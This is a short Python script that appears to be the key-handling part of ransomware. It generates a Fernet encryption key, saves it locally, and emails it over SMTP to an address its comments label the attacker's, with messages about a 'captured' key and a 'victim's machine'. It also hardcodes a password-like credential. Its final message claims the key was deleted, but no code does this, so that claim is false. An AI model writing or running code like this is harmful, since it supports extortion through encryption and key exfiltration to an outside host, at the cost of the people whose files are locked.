import smtplib
import os
from cryptography.fernet import Fernet
from email.mime.text import MIMEText

# Generate encryption key
key = Fernet.generate_key()

# Save key locally
with open("secret.key", "wb") as key_file:
    key_file.write(key)

print("Encryption key generated!")

# Email Configuration
EMAIL_ADDRESS = "example@mail.com"  # Replace with your sender email
EMAIL_PASSWORD = "fCQd39qsyyEmU8z"  # Replace with Email Password (Not your actual password)
RECIPIENT_EMAIL = "example@mail.com"  # Attacker's email

# Create email message
subject = "New Encryption Key Captured"
body = f"Encryption Key: {key.decode()}"
msg = MIMEText(body)
msg["Subject"] = subject
msg["From"] = EMAIL_ADDRESS
msg["To"] = RECIPIENT_EMAIL

# Send Email with Key
try:
    with smtplib.SMTP_SSL("mail.example.com", 465) as server:
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())

    print("Encryption key sent to attacker!")
except Exception as e:
    print(f"Error sending email: {e}")

print("Encryption key deleted from victim's machine!")
